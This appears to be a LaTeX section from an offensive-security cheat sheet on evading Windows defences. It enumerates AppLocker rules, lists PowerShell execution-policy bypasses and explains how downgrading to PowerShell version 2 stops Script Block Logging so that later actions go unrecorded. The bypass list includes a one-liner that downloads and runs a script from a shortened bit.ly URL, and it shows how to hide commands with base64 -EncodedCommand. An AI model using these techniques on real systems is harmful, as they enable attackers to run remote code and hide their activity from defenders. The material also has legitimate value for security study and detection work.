\section{Evade security}
\subsection{AppLockerPolicy}

\begin{verbatim}
Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$a = Get-ApplockerPolicy -effective
$a.rulecollections
\end{verbatim}

\subsection{Execution Policy}

\begin{verbatim}
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
\end{verbatim}

\subsection{Constrained language}
\begin{verbatim}
Get-host
powershell.exe -version 2
Get-host
\end{verbatim}
We can now see that we are running an older version of PowerShell from the
output above. Notice the difference in the version reported. It validates we
have successfully downgraded the shell. Let's check and see if we are still
writing logs. The primary place to look is in the
\verb+PowerShell Operational Log+ found under 
\verb+Applications and Services Logs>Microsoft>Windows>PowerShell> Operational+.
All commands executed in our session will log to this file. 
The \verb+Windows PowerShell+ log located at 
\verb+Applications and Services Logs > Windows PowerShell+ is also a good place
to check. An entry will be made here when we start an instance of PowerShell.
In the image below, we can see the red entries made to the log from the current
PowerShell session and the output of the last entry made at 2:12 pm when the
downgrade is performed. It was the last entry since our session moved into a
version of PowerShell no longer capable of logging. Notice that, that event
corresponds with the last event in the \verb+Windows PowerShell+ log entries.

With
\href{https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2}{Script
Block Logging} enabled, we can see that whatever we type into the terminal gets
sent to this log. If we downgrade to PowerShell V2, this will no longer
function correctly. Our actions after will be masked since Script Block Logging
does not work below PowerShell 3.0. Notice above in the logs that we can see
the commands we issued during a normal shell session, but it stopped after
starting a new PowerShell instance in version 2. Be aware that the action of
issuing the command \verb+powershell.exe -version 2+ within the PowerShell
session will be logged. So evidence will be left behind showing that the
downgrade happened, and a suspicious or vigilant defender may start an
investigation after seeing this happen and the logs no longer filling up for
that instance. We can see an example of this in the image below. Items in the
red box are the log entries before starting the new instance, and the info in
green is the text showing a new PowerShell session was started in HostVersion
2.0.

